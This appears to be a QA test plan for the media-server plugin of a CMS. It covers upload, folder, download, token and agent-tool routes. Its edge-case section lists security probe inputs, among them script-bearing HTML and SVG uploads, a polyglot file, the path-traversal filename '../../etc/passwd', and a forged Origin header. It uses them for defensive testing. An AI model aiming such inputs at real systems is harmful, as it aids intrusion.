# @ortha-cms/media-server — Test Artifact

> **Unit:** `packages/media/server` · **Package:** `@ortha-cms/media-server` · **Kind:** server plugin
> **Source of truth:** `packages/media/server/AGENTS.md`
> **Generated:** 2026-08-11

## 1. Scope & Preconditions

**Owns:** the `media_folder` / `media_asset` tables and their migrations; the folder
tree and asset CRUD; the `StorageProvider` port + `StorageRegistry` +
`StorageResolver` seam; image derivative generation (`thumb`/`preview`) via the
`ImageProcessor` port; the session HTTP surface at `/api/media`; the
token-authenticated pair at `/api/v1/media`; the media Insights read-model at
`/api/insights/media/*`; five agent tools; and the bindings of content-server's
`MEDIA_ASSET_RESOLVER` and copilot-domain's `COPILOT_ATTACHMENT_RESOLVER`.

**Does NOT own:** the bytes (a `StorageProvider` package holds them —
`provider-local` / `provider-s3`, constructed at `apps/server/src/plugins.ts`);
the admin UI (`@ortha-cms/media-admin`); the `field.media` content field type
(that is content-server's — this only binds the resolver port); authentication or
workspace membership (identity + workspaces); and **any HTTP security headers**
(there is no helmet/CSP/nosniff anywhere in the repo — verified by grep, see
`🐞 BUG-media-server-01`).

- **Entry points**
  - Session routes (all `PermissionsGuard` + `WorkspaceGuard`, state-changing ones
    also `OriginGuard`):
    - `GET /api/media/folders` — `packages/media/server/src/lib/http/controllers/list-folders.controller.ts:379`
    - `POST /api/media/folders` — `.../create-folder.controller.ts:192`
    - `PATCH /api/media/folders/:id` — `.../rename-folder.controller.ts:240`
    - `DELETE /api/media/folders/:id` (204, cascades) — `.../delete-folder.controller.ts:290`
    - `GET /api/media/assets` — `.../list-assets.controller.ts:33`
    - `POST /api/media/assets` (multipart) — `.../upload-asset.controller.ts:64`
    - `GET /api/media/assets/:id/raw?variant=` — `.../download-asset.controller.ts:48` (**no `WorkspaceGuard`** — membership-derived)
    - `PATCH /api/media/assets/:id` — `.../update-asset.controller.ts:138`
    - `POST /api/media/assets/:id/duplicate` — `.../duplicate-asset.controller.ts:340`
    - `DELETE /api/media/assets` (bulk `{ ids }`) — `.../delete-assets.controller.ts:82`
    - `GET /api/insights/media/{storage,uploads,alt}` — `.../media-insights.controller.ts`
  - Token routes (`ApiTokenGuard` + `ApiTokenWorkspaceGuard`, `@Public()`):
    - `POST /api/v1/media/assets` — `packages/media/server/src/lib/http/controllers/public-media.controller.ts:98`
    - `GET /api/v1/media/assets/:id/raw` — `.../public-media.controller.ts:156`
  - DI ports **declared**: `STORAGE_REGISTRY`, `STORAGE_RESOLVER`, `IMAGE_PROCESSOR`,
    `ASSET_REPOSITORY`, `FOLDER_REPOSITORY` (`.../domain/storage-provider.ts:75,89`).
  - DI ports **bound**: `MEDIA_ASSET_RESOLVER`, `COPILOT_ATTACHMENT_RESOLVER`
    (`packages/media/server/src/lib/media.module.ts:2,20`).
  - Exported API: `MediaServerPlugin`, `StorageProvider` / `PutObject` /
    `StoredObject` types, the view types.

- **Runtime prerequisites**
  - Postgres (`docker compose up -d`) and a `.env` with `DATABASE_URL`.
  - Migrations applied: `npx nx run server:db:migrate`.
  - `MEDIA_MAX_UPLOAD_BYTES` (default `52_428_800`). Read at **module load**, not
    from DI config — `upload-asset.controller.ts:37`.
  - `MEDIA_LOCAL_ROOT` for a persistent blob directory (defaults to `./.storage/media`).
  - A workspace, a membership, and a role holding `media:read` / `media:create` /
    `media:update` / `media:delete`.
  - For the `/v1` pair: an API token. `media:create` is **`full` scope only**;
    `media:read` is carried by both scopes.
  - `sharp` must load for derivatives (`infrastructure/image/sharp-image-processor.ts`).

- **How to exercise it manually**
  ```bash
  docker compose up -d
  npx nx run server:db:migrate
  npm run dev              # API on :3000
  ```
  Then, with a session cookie jar and a workspace id:
  ```bash
  curl -c j -X POST localhost:3000/api/auth/login \
    -H 'content-type: application/json' \
    -d '{"email":"admin@example.com","password":"…"}'

  curl -b j -X POST localhost:3000/api/media/assets \
    -H "X-Workspace-Id: $WS" -H "Origin: http://localhost:4200" \
    -F 'file=@./logo.png;type=image/png'

  curl -b j "localhost:3000/api/media/assets/$ID/raw?variant=thumb" -i
  ```
  The admin surface lives at `http://localhost:4200/workspaces/:id/media`.

- **Dependencies that must be healthy**: `@ortha-cms/database` (the pool,
  `UnitOfWork`, `OutboxWriter`), `@ortha-cms/identity-server` (`PermissionsGuard`,
  `OriginGuard`, `PERMISSIONS`), `@ortha-cms/workspaces-server`
  (`WorkspaceGuard`, `MembershipCheckQuery`), `@ortha-cms/content-server`
  (`ApiTokenGuard`, `ApiTokenWorkspaceGuard`, `MEDIA_ASSET_RESOLVER`), a
  registered storage provider under `config.defaultProvider` (the host registers
  **only `local`** — `apps/server/src/plugins.ts:88`).

## 2. Feature Inventory

| # | Feature | Where it lives | Coverage |
| --- | --- | --- | --- |
| F1 | List the workspace's folders + per-folder and root asset counts | `packages/media/server/src/lib/infrastructure/queries/list-folders.query.ts:169` | ✅ E2E |
| F2 | Create a folder (optional `parentId`, `FOR SHARE` on the parent) | `packages/media/server/src/lib/application/use-cases/create-folder.use-case.ts:33` | ✅ E2E |
| F3 | Rename a folder | `packages/media/server/src/lib/application/use-cases/rename-folder.use-case.ts:29` | ✅ E2E |
| F4 | Delete a folder — cascading the whole subtree + its assets + blobs | `packages/media/server/src/lib/application/use-cases/delete-folder.use-case.ts:103` | ✅ E2E |
| F5 | Upload one asset (multipart, session) | `packages/media/server/src/lib/http/controllers/upload-asset.controller.ts:64` | ✅ E2E |
| F6 | Provider routing at write, recorded on the row for read/delete | `packages/media/server/src/lib/application/use-cases/upload-asset.use-case.ts:92` | ❌ NONE |
| F7 | Image derivative generation (`thumb` ≤320, `preview` ≤1280, WebP, never upscaled) | `.../upload-asset.use-case.ts:186` | ✅ E2E |
| F8 | Blob reclamation on a failed upload (original + derivatives) | `.../upload-asset.use-case.ts:170-179` | ❌ NONE |
| F9 | List one folder's assets — `?folderId=&search=&kind=&sort=&page=&pageSize=` | `packages/media/server/src/lib/infrastructure/queries/list-assets.query.ts:44` | ⚠️ PARTIAL |
| F10 | Download the bytes, membership-derived scope, `?variant=` | `packages/media/server/src/lib/http/controllers/download-asset.controller.ts:48` | ✅ E2E |
| F11 | `?variant=` falls back to the original (`Object.hasOwn` guard) | `packages/media/server/src/lib/infrastructure/queries/download-asset.query.ts:66-81` | ✅ E2E |
| F12 | Patch an asset — rename / move / retag / set alt | `packages/media/server/src/lib/application/use-cases/update-asset.use-case.ts:186` | ⚠️ PARTIAL |
| F13 | Duplicate an asset (bytes + derivatives + row) | `packages/media/server/src/lib/application/use-cases/duplicate-asset.use-case.ts:334` | ✅ E2E |
| F14 | Bulk delete assets (≤100 ids), blobs reclaimed post-commit | `packages/media/server/src/lib/application/use-cases/delete-assets.use-case.ts:264` | ✅ E2E |
| F15 | `media.*` domain events written to the outbox in the same transaction | `packages/media/server/src/lib/domain/events/media-events.ts` | ❌ NONE |
| F16 | Token upload `POST /api/v1/media/assets`, attributed to the token's creator | `packages/media/server/src/lib/http/controllers/public-media.controller.ts:109` | ❌ NONE |
| F17 | Token download `GET /api/v1/media/assets/:id/raw`, token-workspace scoped | `.../public-media.controller.ts:163` | ❌ NONE |
| F18 | Upload size cap → 413 via `MulterUploadFilter` | `packages/media/server/src/lib/http/multer-upload.filter.ts:22` | ❌ NONE |
| F19 | `MEDIA_ASSET_RESOLVER` binding (existence + `accept` + thumb/preview refs) | `packages/media/server/src/lib/infrastructure/queries/media-asset-resolver.query.ts` | ✅ E2E |
| F20 | Insights `storage` (count + bytes per kind) | `packages/media/server/src/lib/infrastructure/queries/media-insights.query.ts` | ✅ E2E |
| F21 | Insights `uploads` (per-bucket across `?days=`) | same | ✅ E2E |
| F22 | Insights `alt` (blank alt is not covered) | same | ✅ E2E |
| F23 | Agent tools `media_assets_search` / `media_folders_list` / `media_asset_read` (both surfaces) | `packages/media/server/src/lib/copilot/media-tool.provider.ts` | ⚠️ PARTIAL |
| F24 | Agent tools `media_propose_alt_text` / `media_propose_file` (copilot only) | `.../copilot/alt-text-proposal.provider.ts`, `.../create-file-proposal.provider.ts` | ⚠️ PARTIAL |
| F25 | `COPILOT_ATTACHMENT_RESOLVER` binding (omits foreign assets) | `packages/media/server/src/lib/copilot/attachment-resolver.query.ts` | ✅ E2E |
| F26 | Permission gating per route (`media:read/create/update/delete`) | every controller's `@RequirePermissions` | ⚠️ PARTIAL |
| F27 | `OriginGuard` on state-changing routes | `create-folder.controller.ts:185` etc. | ⚠️ PARTIAL |

## 3. Manual Test Plan

Every block assumes: Postgres up, migrations applied, `npm run dev`, a workspace
`$WS` the caller is a member of, and `Origin: http://localhost:4200` on writes.

### F1 — List folders + counts

**Preconditions:** admin session; two folders, one nested; two assets at the root.

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `GET /api/media/folders` with `X-Workspace-Id: $WS` | `200`, body `{ folders: [...], rootAssetCount: 2 }` |
| 2 | Inspect a folder object | `{ id, name, parentId, assetCount, createdAt }`; `parentId` is `null` for a top-level folder |
| 3 | Confirm ordering | folders are sorted by `name` ascending (`list-folders.query.ts:173`) |
| 4 | Repeat with a workspace the caller is not a member of | `403` from `WorkspaceGuard` |

**Keyboard-only path / screen reader:** N/A (JSON route). The consuming UI is
covered in `docs/testing/media-admin.md`.

### F2 — Create a folder

**Preconditions:** a role holding `media:create`.

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `POST /api/media/folders` `{"name":"Brand"}` | `201`, `{ id: "<uuid>" }` |
| 2 | `POST` again with `{"name":"Logos","parentId":"<id from 1>"}` | `201`; `GET /folders` shows `Logos.parentId === <id>` |
| 3 | `POST` `{"name":"  ","parentId":null}` | `400` — `@IsNotEmpty` on `CreateFolderDto` (`create-folder.dto.ts:21`) |
| 4 | `POST` `{"name":"x","parentId":"<uuid of a folder in another workspace>"}` | `404` — `existsForShare` is workspace-scoped |
| 5 | Omit the `Origin` header | `403` from `OriginGuard` |

### F3 — Rename a folder

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `PATCH /api/media/folders/<id>` `{"name":"Brand assets"}` | `200`, `{ id }` |
| 2 | `GET /folders` | the folder's `name` is `Brand assets` |
| 3 | Rename to the same value | `200`; `Folder.rename` returns early and raises no event (`domain/folder.ts:205-207`) |
| 4 | `PATCH` with `{"name":"<121 chars>"}` | `400` — `@MaxLength(120)` |
| 5 | `PATCH` a folder id from another workspace | `404` |

### F4 — Delete a folder (cascade)

**Preconditions:** `Brand` → `Logos` → `Old`, with one asset in each.

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `DELETE /api/media/folders/<Brand id>` | `204` |
| 2 | `GET /api/media/folders` | none of the three folders is listed |
| 3 | `GET /api/media/assets?folderId=<Logos id>` | `200` with `items: []`, `total: 0` |
| 4 | Inspect `$MEDIA_LOCAL_ROOT/$WS/` on disk | the three assets' directories (originals **and** `variants/`) are gone |
| 5 | Repeat step 1 | `404` (`FolderNotFoundError` → `toHttp`) |

### F5 — Upload one asset

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `POST /api/media/assets` with `-F 'file=@logo.png;type=image/png'` | `201`; body is an `AssetView` with `id`, `name: "logo.png"`, `kind: "image"`, `mimeType: "image/png"`, `size`, `url: "/api/media/assets/<id>/raw"`, `variants: ["thumb","preview"]`, `uploadedBy: "<display name>"` |
| 2 | Add `-F 'folderId=<uuid>'` | the asset lands in that folder; `GET /assets?folderId=<uuid>` returns it |
| 3 | `POST` with no `file` part | `400 "file is required"` (`upload-asset.controller.ts:70`) |
| 4 | `POST` with an extra text field `bogus=x` | `400` — the strict `ValidationPipe` rejects undeclared keys |
| 5 | `POST` as a `viewer` | `403` |
| 6 | `POST` with no session | `401` |

### F6 — Provider routing

**Preconditions:** a host build that registers two providers and a `resolve`
handler. **The shipped host registers only `local`** (`apps/server/src/plugins.ts:88`),
so this cannot be exercised against `apps/server` as-is.

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | Register `{ local, s3 }` with `resolve: (ctx) => ctx.kind === 'video' ? 's3' : 'local'` | boot succeeds |
| 2 | Upload a PNG | `media_asset.storage_provider === 'local'` |
| 3 | Upload an MP4 | routing picks `s3`; with the shipped stub this throws — see `🐞 BUG-media-provider-s3-01` |
| 4 | Change the resolver to always return `local`, then download the MP4 | it still routes by the **stored** `storage_provider` (`download-asset.query.ts:86-88`) |

### F7 — Image derivatives

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | Upload a 2000×1500 JPEG | `AssetView.variants === ["thumb","preview"]`; `width: 2000`, `height: 1500` |
| 2 | `GET /assets/<id>/raw?variant=thumb` | `200`, `Content-Type: image/webp`, longest edge ≤ 320px |
| 3 | Upload a 200×150 PNG | `variants === ["thumb"]` — `preview` is skipped (never upscaled) |
| 4 | Upload an SVG (`image/svg+xml`) | `variants === []`; the upload still succeeds (best-effort) |
| 5 | Upload a `.txt` | `kind: "document"`, `variants === []`, no buffering path taken |

### F8 — Blob reclamation on a failed upload

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | Upload with `folderId` set to a folder id deleted between the resolver call and the transaction (or simply a valid-uuid folder in another workspace) | `404`; the transaction rolls back |
| 2 | Inspect `$MEDIA_LOCAL_ROOT/$WS/<assetId>/` | the directory is empty of files — the `catch` at `upload-asset.use-case.ts:170` removed every key in `written` |
| 3 | `GET /api/media/assets` | no row for that upload |

### F9 — List assets with filters

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `GET /assets` (no params) | one page of the **workspace root** (`folderId` defaults to `null`), `pageSize: 24`, `page: 1` |
| 2 | `GET /assets?folderId=<id>&pageSize=5&page=2` | items 6–10 of that folder, `total` = the folder's real count |
| 3 | `GET /assets?search=logo` | ILIKE `%logo%` over `name` only (not tags) |
| 4 | `GET /assets?kind=image` | only `kind: "image"` rows |
| 5 | `GET /assets?sort=largest` | descending `size`, `id` as the tiebreaker |
| 6 | `GET /assets?pageSize=5000` | clamped to `100` (`list-assets.controller.ts:50`) |

### F10 — Download the bytes

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `GET /assets/<id>/raw` as a member of the owning workspace | `200`, `Content-Type` = the stored `mimeType`, `Content-Disposition: inline; filename="logo.png"`, `Content-Length` = size |
| 2 | Send **no** `X-Workspace-Id` header | still `200` — this route deliberately has no `WorkspaceGuard` |
| 3 | Send `X-Workspace-Id` naming a *different* workspace | still `200` — the header is ignored; membership in the **owning** workspace is what grants it (`download-asset.controller.ts:57`) |
| 4 | As a user who holds `media:read` but is a member of no workspace | `404`, not `403` |
| 5 | `GET /assets/not-a-uuid/raw` | `400` from `ParseUUIDPipe` |

### F11 — Variant fallback

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `?variant=preview` on a small image with no preview | `200`, the **original** bytes and its original `Content-Type` |
| 2 | `?variant=toString` | `200`, the original — `Object.hasOwn` refuses prototype members (`download-asset.query.ts:70`) |
| 3 | `?variant=` (empty) | `200`, the original |

### F12 — Patch an asset

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `PATCH /assets/<id>` `{"name":"hero.png"}` | `200`; the returned view's `name` is `hero.png` |
| 2 | `{"folderId":"<uuid>"}` | the asset moves; `GET /folders` counts shift |
| 3 | `{"folderId":null}` | the asset moves to the root |
| 4 | `{"tags":["  a ","a",""]}` | stored as `["a"]` — trimmed, de-duplicated, blanks dropped (`domain/asset.ts:481-487`) |
| 5 | `{"alt":"   "}` | stored as `null` (`domain/asset.ts:491`) |
| 6 | `{"name":"a/b.png"}` | `400` — `FileName` rejects separators (`value-objects/file-name.ts:20`) |
| 7 | `{"tags":[<51 items>]}` | `400` — `@ArrayMaxSize(50)` |
| 8 | As a `contributor` without `media:update` | `403` |

### F13 — Duplicate an asset

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `POST /assets/<id>/duplicate` | `201`; new asset named `logo copy.png`, same folder, same `kind`/`mimeType`, `tags` and `alt` carried over |
| 2 | Compare `variants` | the copy has the same variant **names** with new keys |
| 3 | `GET /assets/<newId>/raw?variant=thumb` | `200`, the copied derivative bytes |
| 4 | Duplicate twice | two rows both named `logo copy.png` — no uniqueness rule exists |

### F14 — Bulk delete

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `DELETE /assets` `{"ids":["a","b"]}` | `200`, `{ deleted: 2 }` |
| 2 | Include an id from another workspace | it is silently not deleted; `deleted` counts only the found rows |
| 3 | `{"ids":[]}` | `400` — `@ArrayNotEmpty` |
| 4 | `{"ids":[<101 uuids>]}` | `400` — `@ArrayMaxSize(100)` |
| 5 | `{"ids":["nope"]}` | `400` — `@IsUUID('all', { each: true })` |
| 6 | Check disk | both assets' originals **and** derivatives are gone (`reclaim-asset-blobs.ts:450`) |

### F15 — Outbox events

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | Upload an asset, then `SELECT kind, aggregate_id FROM outbox_events ORDER BY id DESC LIMIT 1` | one `media.asset.uploaded` row carrying the actor |
| 2 | Rename, move, retag, set alt in one PATCH | `media.asset.updated` / `media.asset.moved` rows — one per mutator that actually changed something |
| 3 | Delete a folder holding 3 assets | 3 `media.asset.deleted` + 4 `media.folder.deleted` rows, all in the delete's transaction |

### F16 — Token upload

**Preconditions:** a `full`-scope API token covering `$WS`, minted by a user.

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `POST /api/v1/media/assets` `-H "Authorization: Bearer $T" -F file=@logo.png` | `201`, an `AssetView` |
| 2 | `SELECT uploaded_by FROM media_asset …` | the id of the user who **minted** the token |
| 3 | Repeat with a `read`-scope token | `403` — `scopePermissions` withholds `media:create` |
| 4 | Add `?folderId=<uuid>` | the asset lands there; an unknown uuid is `404` |
| 5 | Use a session cookie instead of a bearer | `401` — the route is `@Public()`, cookies are not accepted |

### F17 — Token download

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `GET /api/v1/media/assets/<id>/raw` with a `read` token covering the owning workspace | `200`, the bytes |
| 2 | Same token, an asset in **another** workspace inside the token's bucket, with `X-Workspace-Id` naming the first | `404` (`public-media.controller.ts:173`) |
| 3 | An asset outside the bucket entirely | `404`, identical response |
| 4 | Omit `X-Workspace-Id` on a single-workspace token | `200` |
| 5 | Omit it on a multi-workspace token | `400` from `ApiTokenWorkspaceGuard` |

### F18 — Size cap

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `MEDIA_MAX_UPLOAD_BYTES=1024`, restart, upload a 5 KB file | `413 "File exceeds the maximum upload size."` |
| 2 | Upload exactly 1024 bytes | `201` |
| 3 | Set `config.plugins.media.maxUploadBytes` to a different number without touching the env | the route still enforces the **env** value — see `🐞 BUG-media-server-07` |

### F19 — `MEDIA_ASSET_RESOLVER`

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | Save a content entry with `{"coverImage":"<asset id>"}` | `200/201` |
| 2 | Save with an asset id from another workspace | `422`, uniform message (no not-found-vs-forbidden signal) |
| 3 | Save with an asset whose `kind` is outside the field's `accept` | `422` |
| 4 | `GET /api/content/:type/:id/media` | refs carrying `url`, `thumbUrl`, `previewUrl` |
| 5 | Same for an SVG | `thumbUrl`/`previewUrl` are absent; the admin falls back to `url` |

### F20–F22 — Insights

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `GET /api/insights/media/storage` | per-kind `{ kind, count, bytes }` plus totals; `bytes` is a **number**, not a string |
| 2 | Same on an empty workspace | `200` with empty groups and zero totals |
| 3 | `GET /api/insights/media/alt` | an image with `alt: "   "` counts as **not** covered |
| 4 | `GET /api/insights/media/uploads?days=100000` | clamped, not rejected |
| 5 | Any of the three without a workspace header | `400`; as a non-member `403`; with no session `401` |

### F23–F24 — Agent tools

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | `MCP_ENABLED=true`, `POST /api/v1/mcp` `tools/list` with a `read` token | `media_assets_search`, `media_folders_list`, `media_asset_read` present; **no** `media_propose_*` |
| 2 | Call `media_assets_search` with no `folderId` | spans every folder in the workspace |
| 3 | Call it with `folderId: null` | root only |
| 4 | Inspect a result item | narrowed projection with `downloadPath: "/api/v1/media/assets/<id>/raw"` over MCP |
| 5 | Same tool through the copilot | `downloadPath: "/media/assets/<id>/raw"` |
| 6 | `media_asset_read` on an asset in another workspace | "no such asset", identical to a missing id |
| 7 | `media_asset_read` on a 50 MB binary | refused by the MIME allowlist, not buffered |

### F26–F27 — Permissions and origin

| Step | Action | Expected result |
| --- | --- | --- |
| 1 | For each of `admin` / `contributor` / `viewer`, call every route | see the permission matrix in §4 (EC-30…EC-33) |
| 2 | `POST /api/media/folders` with `Origin: http://evil.test` | `403` |
| 3 | `GET /api/media/folders` with the same bad `Origin` | `200` — reads carry no `OriginGuard` |

## 4. Edge Cases & Negative Paths

### Upload — content type, name, size

- **EC-01 — Upload an HTML file declaring `Content-Type: text/html`.** `❌ NONE`
  Steps: `curl -F 'file=@x.html;type=text/html'`, then open `/api/media/assets/<id>/raw`.
  Expected: the bytes are served as an attachment, or with `X-Content-Type-Options: nosniff`.
  Suspected: served **inline** with `Content-Type: text/html` from the admin's own
  origin → stored XSS → `🐞 BUG-media-server-01`.
- **EC-02 — Upload an SVG containing `<script>`.** `❌ NONE`
  `MediaKind.classify` files it as `image` (`value-objects/media-kind.ts:37`), Sharp
  produces no derivatives, and the raw route serves `image/svg+xml` inline. Same bug.
- **EC-03 — Upload `evil.png` whose bytes are a PHP/HTML polyglot, declared `image/png`.** `❌ NONE`
  There is **no magic-byte sniffing anywhere** — `command.contentType` is the
  client's multipart header, threaded straight to `MediaKind.fromMime`
  (`upload-asset.use-case.ts:89`) and persisted to `media_asset.mime_type`.
- **EC-04 — Double extension `report.pdf.html`.** `❌ NONE` No extension allowlist
  exists at all; only `FileName` length/separator rules apply.
- **EC-05 — Filename `../../etc/passwd`.** `❌ NONE`
  `FileName.create` rejects `/` and `\` (`file-name.ts:20-22`) → `400`. **Correct.**
- **EC-06 — Filename `..`.** `❌ NONE`
  `FileName` accepts it (no separators). `provider-local`'s `sanitize` preserves
  `.` and `-`, so the key becomes `<ws>/<id>/..` → see `🐞 BUG-media-provider-local-02`.
- **EC-07 — Filename with a NUL byte (`a\x00.png`).** `❌ NONE`
  `FileName` accepts it; the DB stores the raw name. `provider-local` sanitizes it
  to `_` in the key, so the blob is safe, but `media_asset.name` holds a NUL —
  and `Content-Disposition` runs it through `encodeURIComponent`, so the header is
  safe. Cosmetic only.
- **EC-08 — 255-char filename, then duplicate it.** `❌ NONE`
  `duplicateName` appends `" copy"` → 260 chars → `FileName.create` throws
  `InvalidFileNameError` → `400` from a route the user expected to succeed
  (`duplicate-asset.use-case.ts:348, 406`). Unhelpful but not dangerous.
- **EC-09 — Unicode / emoji / RTL filename.** `❌ NONE`
  Stored verbatim in `media_asset.name`; `provider-local` reduces every non-`\w.-`
  run to `_`, so `логотип.png` and `商標.png` both key as `_.png` — **distinct
  assets can share a storage key path segment**, but the `<assetId>/` segment keeps
  them apart. Safe; the on-disk name is unrecognisable.
- **EC-10 — Zero-byte file.** `❌ NONE` Accepted. `size: 0`, checksum of the empty
  string, no derivatives.
- **EC-11 — Exactly `MEDIA_MAX_UPLOAD_BYTES`.** `❌ NONE` Accepted (multer errors
  only when the cap is *crossed*). One byte more → `413`.
- **EC-12 — 200 MB upload with the default cap.** `❌ NONE`
  multer stops at 50 MB, so the heap is bounded — but the whole 50 MB is buffered
  in memory (`memoryStorage`, then `Readable.from(file.buffer)` at
  `upload-asset.controller.ts:85`), contradicting the port's "a stream so large
  files never buffer fully in memory" (`domain/storage-provider.ts:20`) →
  `🐞 BUG-media-server-06`.
- **EC-13 — Two concurrent uploads of the same filename to the same folder.** `❌ NONE`
  Both succeed. Keys differ (`<assetId>` segment), rows differ, names collide.
  There is **no unique index** on `(workspace_id, folder_id, name)`
  (`infrastructure/schema/media-asset.ts:72-74`) — by design, but undocumented.
- **EC-14 — Client aborts mid-upload.** `❌ NONE`
  Express/multer abort the request; no row is written. But if the body was fully
  received before the abort, the transaction may still commit — the admin's
  cancel is client-only (see `🐞 BUG-media-admin-04`).
- **EC-15 — `sharp` throws on a corrupt JPEG.** `❌ NONE`
  `deriveImage` returns `{ variants: {} }` and the upload succeeds — documented,
  correct.

### List / read

- **EC-16 — `?folderId=not-a-uuid`.** `❌ NONE`
  No validation on the query param (`list-assets.controller.ts:36`); the value goes
  straight into `eq(mediaAsset.folderId, …)` → Postgres `invalid input syntax for
  type uuid` → **500** → `🐞 BUG-media-server-03`.
- **EC-17 — `?kind=bogus`.** `❌ NONE`
  Cast to `MediaKindColumn` without checking (`list-assets.query.ts:59`) → Postgres
  `invalid input value for enum media_kind` → **500**. Same bug.
- **EC-18 — `?folderId=` (empty string).** `❌ NONE`
  Falsy → `isNull(folderId)` → the root. Reasonable but undocumented.
- **EC-19 — `?search=%` or `?search=_`.** `❌ NONE`
  Passed unescaped into `ilike(name, '%${search}%')` (`list-assets.query.ts:64`), so
  `_` matches any single character and `%` matches everything. The admin's own
  search escapes metacharacters (`entry-search.ts`); media's does not →
  `🐞 BUG-media-server-05`.
- **EC-20 — `?page=0`, `?page=-1`, `?page=abc`, `?pageSize=0`.** `❌ NONE`
  All fall back to the default (`toPositiveInt`, `list-assets.controller.ts:16`). Correct.
- **EC-21 — `?page=999999999`.** `❌ NONE` Empty `items`, honest `total`. No clamping,
  which is fine for a server (the admin clamps).
- **EC-22 — `?sort=<unknown>`.** `❌ NONE` Falls through to `newest`. Correct.
- **EC-23 — `?pageSize=1e3`.** `❌ NONE` `Number('1e3') === 1000`, integer → clamped
  to 100. Correct.

### Folders

- **EC-24 — Move a folder into its own descendant.** `❌ NONE`
  **Not reachable.** `RenameFolderUseCase` only renames; `Folder.parentId` is
  `readonly` (`domain/folder.ts:140`) and no route sets it. Cycles cannot be
  created through the API. Checked and cleared.
- **EC-25 — Two folders with the same name under one parent.** `❌ NONE`
  Allowed — no unique index (`media-folder.ts:99-101`). `CreateFolderDto`'s JSDoc
  claims "unique among its siblings" (`create-folder.dto.ts:12`), which is false →
  documentation drift, filed as `🐞 BUG-media-server-08`.
- **EC-26 — Delete a folder while a sibling request creates a subfolder under a descendant.** `❌ NONE`
  Guarded: `findDescendantsForUpdate` re-walks and loops until the subtree stops
  changing, bounded by `SUBTREE_WALK_ROUNDS`. Checked and cleared by reading
  `drizzle-folder.repository.ts` and `delete-folder.use-case.ts:113`.
- **EC-27 — Cascade must not escape the workspace.** `✅ E2E`
  `apps/server-e2e/src/server/media/media-folders.spec.ts:157` pins it.
- **EC-28 — Delete a folder whose asset blob is already missing on disk.** `❌ NONE`
  `reclaimAssetBlobs` swallows everything (`reclaim-asset-blobs.ts:452`), so the
  rows still go. Correct.
- **EC-29 — Delete a folder holding 10 000 assets.** `❌ NONE`
  `findManyByFolderIds` loads every `Asset` aggregate into memory, then
  `Promise.all` fires 10 000 concurrent `provider.remove` calls
  (`delete-folder.use-case.ts:146`). Unbounded fan-out → `🐞 BUG-media-server-09`.

### Permission matrix and tenancy

- **EC-30 — `viewer`.** `⚠️ PARTIAL` (`media-folders.spec.ts:202,217`)
  Holds `media:read`: `GET /folders`, `GET /assets`, `GET /assets/:id/raw` → `200`.
  All writes → `403`.
- **EC-31 — `contributor`.** `❌ NONE` Holds create/update per the role map but **not**
  `media:delete`; `DELETE /assets` and `DELETE /folders/:id` must be `403`. Untested.
- **EC-32 — Unauthenticated.** `⚠️ PARTIAL` `401` on upload (`media-assets.spec.ts:345`)
  and on folders (`media-folders.spec.ts:195`); the other routes are untested.
- **EC-33 — Authenticated, not a member of `$WS`.** `⚠️ PARTIAL`
  `WorkspaceGuard` → `403` on every header-scoped route. The **raw** route is the
  exception and returns `404` (`media-assets.spec.ts:436`) — correct, since a `403`
  there would confirm the asset id exists.
- **EC-34 — Same asset id, different workspace, on `PATCH`/`DELETE`/`duplicate`.** `⚠️ PARTIAL`
  `media-assets.spec.ts:375` covers the read. Writes go through
  `assets.findById(id, workspaceId)` → `AssetNotFoundError` → `404`. Correct shape,
  untested for the write verbs.
- **EC-35 — `/v1` token reaching across workspaces inside its own bucket.** `❌ NONE`
  `public-media.controller.ts:173` compares `location.workspaceId !== workspaceId`
  → `404`. Entirely untested; this is the highest-value uncovered authorization rule.
- **EC-36 — A token whose `createdBy` is null uploads.** `❌ NONE`
  `400 "This token has no creator on record and cannot upload."` — reachable only
  if the minting user was hard-deleted.

### Concurrency, failure and idempotency

- **EC-37 — Upload into a folder being deleted.** `❌ NONE`
  `existsForShare` takes `FOR SHARE` inside the transaction
  (`upload-asset.use-case.ts:141`), serializing against the delete's `FOR UPDATE`.
  One of the two loses cleanly. Correct.
- **EC-38 — Move an asset into a folder being deleted.** `❌ NONE` Same guard
  (`update-asset.use-case.ts:215`). Correct.
- **EC-39 — Storage `put` succeeds, then the transaction fails.** `❌ NONE`
  Reclaimed by the `catch`. But with the **S3 stub** registered, `provider.remove`
  throws *synchronously*, which escapes the `catch` block and replaces the original
  error → `🐞 BUG-media-provider-s3-01`.
- **EC-40 — Delete succeeds, blob removal fails.** `❌ NONE`
  Post-commit and best-effort — an orphan blob, no error. Documented as intended;
  there is no GC subscriber yet (AGENTS "Not yet").
- **EC-41 — Replay the same `DELETE /assets` body.** `❌ NONE`
  Second call returns `{ deleted: 0 }`. Idempotent. Correct.
- **EC-42 — Replay `POST /assets/:id/duplicate`.** `❌ NONE` Produces a second copy;
  not idempotent by design.
- **EC-43 — `buildRegistry.get('constructor')`.** `❌ NONE`
  `providers[name]` is a bare index on a plain object (`storage-registry.ts:16`), so
  a prototype key returns a truthy non-provider while `has()` correctly uses
  `hasOwnProperty`. Not reachable from user input today (the name comes from the
  DB or the host's resolver) → `🐞 BUG-media-server-10`, Low.
- **EC-44 — `media_asset.folder_id` has no FK.** `❌ NONE`
  Deleting a folder row out-of-band would orphan its assets into an invisible
  folder. Only the use-case protects this; documented as the cross-plugin-FK rule.

### 4A. Accessibility & Section 508 Conformance

